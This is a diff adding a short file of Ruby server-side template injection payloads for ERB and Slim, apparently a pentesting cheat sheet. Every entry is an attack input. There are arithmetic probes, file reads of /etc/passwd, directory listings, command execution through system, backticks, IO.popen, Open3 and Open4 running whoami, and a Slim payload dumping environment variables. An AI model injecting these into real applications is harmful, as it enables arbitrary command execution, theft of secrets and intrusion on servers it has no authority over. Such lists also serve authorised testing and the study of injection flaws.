@@ -1,0 +1,19 @@
+//ERB
+<%= 7 * 7 %>
+
+//SLIM
+#{ 7 * 7 }
+
+//LFI
+<%= File.open('/etc/passwd').read %>
+//ls
+<%= Dir.entries('/') %>
+//Code exec
+<%= system('cat /etc/passwd') %>
+<%= `ls /` %>
+<%= IO.popen('ls /').readlines()  %>
+<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>
+<% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%>
+
+//Execute code using SLIM
+#{ %x|env| }
